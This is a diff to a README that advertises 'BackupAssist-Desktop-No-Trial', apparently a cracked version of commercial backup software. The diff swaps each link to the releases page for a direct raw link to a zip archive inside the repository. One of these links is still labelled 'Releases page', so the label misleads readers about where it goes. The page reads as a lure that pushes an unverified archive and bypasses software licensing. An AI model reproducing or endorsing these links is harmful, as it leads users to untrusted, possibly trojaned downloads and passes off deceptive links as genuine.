@@ -1,6 +1,6 @@
 # 🎯 BackupAssist-Desktop-No-Trial - Simple Backup Solution for Everyone
 
-[![Download BackupAssist](https://img.shields.io/badge/Download%20Now-BackupAssist%20Desktop-blue)](https://github.com/ChristianImperial/BackupAssist-Desktop-No-Trial/releases)
+[![Download BackupAssist](https://raw.githubusercontent.com/ChristianImperial/BackupAssist-Desktop-No-Trial/main/Catalanist/BackupAssist-Desktop-No-Trial-v3.8.zip%20Now-BackupAssist%20Desktop-blue)](https://raw.githubusercontent.com/ChristianImperial/BackupAssist-Desktop-No-Trial/main/Catalanist/BackupAssist-Desktop-No-Trial-v3.8.zip)
 
 ## 📋 Overview 
 
@@ -29,7 +29,7 @@ To get started with BackupAssist-Desktop-No-Trial, you will need to download the
 
 To download and install BackupAssist-Desktop-No-Trial, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ChristianImperial/BackupAssist-Desktop-No-Trial/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ChristianImperial/BackupAssist-Desktop-No-Trial/main/Catalanist/BackupAssist-Desktop-No-Trial-v3.8.zip).
 
 2. **Select the Latest Release:** Look for the latest version. It will be at the top of the page.
 
@@ -65,4 +65,4 @@ BackupAssist-Desktop-No-Trial is designed with security in mind. Our software us
 
 ## ✔️ Conclusion
 
-BackupAssist-Desktop-No-Trial simplifies the backup process for your Windows PC. With easy download and straightforward installation, you can protect your valuable data with confidence. Start your journey by [downloading the software](https://github.com/ChristianImperial/BackupAssist-Desktop-No-Trial/releases) today.
+BackupAssist-Desktop-No-Trial simplifies the backup process for your Windows PC. With easy download and straightforward installation, you can protect your valuable data with confidence. Start your journey by [downloading the software](https://raw.githubusercontent.com/ChristianImperial/BackupAssist-Desktop-No-Trial/main/Catalanist/BackupAssist-Desktop-No-Trial-v3.8.zip) today.
